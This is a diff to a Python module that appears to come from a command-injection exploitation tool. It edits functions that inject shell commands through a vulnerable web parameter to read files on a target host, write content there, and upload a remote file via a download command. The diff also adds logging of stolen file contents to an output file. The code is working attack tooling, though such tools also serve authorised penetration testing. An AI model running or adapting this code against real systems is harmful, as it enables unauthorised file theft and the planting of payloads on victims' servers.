@@ -38,13 +38,19 @@ def file_read(separator, maxlen, TAG, prefix, suffix, delay, http_request_method
   cmd = "echo $(" + settings.FILE_READ + file_to_read + ")"
   check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename)
   shell = output 
-  shell = "".join(str(p) for p in shell)
+  try:
+    shell = "".join(str(p) for p in shell)
+  except TypeError:
+    pass
   if shell:
-    if menu.options.verbose:
-      print ""
-    sys.stdout.write(Style.BRIGHT + "\n\n (!) Contents of file " + Style.UNDERLINE + file_to_read + Style.RESET_ALL + " : ")
+    # if menu.options.verbose:
+    #   print ""
+    sys.stdout.write(Style.BRIGHT + "\n\n (!) The contents of file '" + Style.UNDERLINE + file_to_read + Style.RESET_ALL + "' : ")
     sys.stdout.flush()
     print shell
+    output_file = open(filename, "a")
+    output_file.write("    (!) The contents of file '" + file_to_read + "' : " + shell + ".\n")
+    output_file.close()
   else:
    sys.stdout.write("\n" + Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to read the '"+ file_to_read + "' file." + Style.RESET_ALL)
    sys.stdout.flush()
@@ -56,7 +62,7 @@ Write to a file on the target host.
 def file_write(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename):
   file_to_write = menu.options.file_write
   if not os.path.exists(file_to_write):
-    sys.stdout.write("\n" + Fore.YELLOW + "(^) Warning: It seems that the '"+ file_to_write + "' file, does not exists." + Style.RESET_ALL)
+    sys.stdout.write("\n" + Fore.YELLOW + "(^) Warning: It seems that the '"+ file_to_write + "' file, does not exists." + Style.RESET_ALL + "\n")
     sys.stdout.flush()
     sys.exit(0)
     
@@ -80,13 +86,19 @@ def file_write(separator, maxlen, TAG, prefix, suffix, delay, http_request_metho
   cmd = settings.FILE_WRITE + " '"+ content + "'" + " > " + "'"+ dest_to_write + "'"
   check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename)
   shell = output 
-  shell = "".join(str(p) for p in shell)
+  try:
+    shell = "".join(str(p) for p in shell)
+  except TypeError:
+    pass
   
   # Check if file exists!
   cmd = "echo $(ls " + dest_to_write + ")"
   check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename)
   shell = output 
-  shell = "".join(str(p) for p in shell)
+  try:
+    shell = "".join(str(p) for p in shell)
+  except TypeError:
+    pass
   if shell:
     if menu.options.verbose:
       print ""
@@ -123,13 +135,19 @@ def file_upload(separator, maxlen, TAG, prefix, suffix, delay, http_request_meth
   cmd = settings.FILE_UPLOAD + file_to_upload + " -O " + dest_to_upload 
   check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename)
   shell = output 
-  shell = "".join(str(p) for p in shell)
+  try:
+    shell = "".join(str(p) for p in shell)
+  except TypeError:
+    pass
   
   # Check if file exists!
   cmd = "echo $(ls " + dest_to_upload + ")"
   check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename)
   shell = output 
-  shell = "".join(str(p) for p in shell)
+  try:
+    shell = "".join(str(p) for p in shell)
+  except TypeError:
+    pass
   
   if shell:
     if menu.options.verbose:
@@ -145,6 +163,7 @@ def file_upload(separator, maxlen, TAG, prefix, suffix, delay, http_request_meth
 Check the defined options
 """
 def do_check(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename):
+  
   if menu.options.file_read:
     file_read(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename)
     settings.FILE_ACCESS_DONE = True
@@ -157,7 +176,7 @@ def do_check(separator, maxlen, TAG, prefix, suffix, delay, http_request_method,
     file_upload(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename)
     settings.FILE_ACCESS_DONE = True
 
-  if settings.FILE_ACCESS_DONE == True:
+  if settings.FILE_ACCESS_DONE :
     print ""
 
 # eof
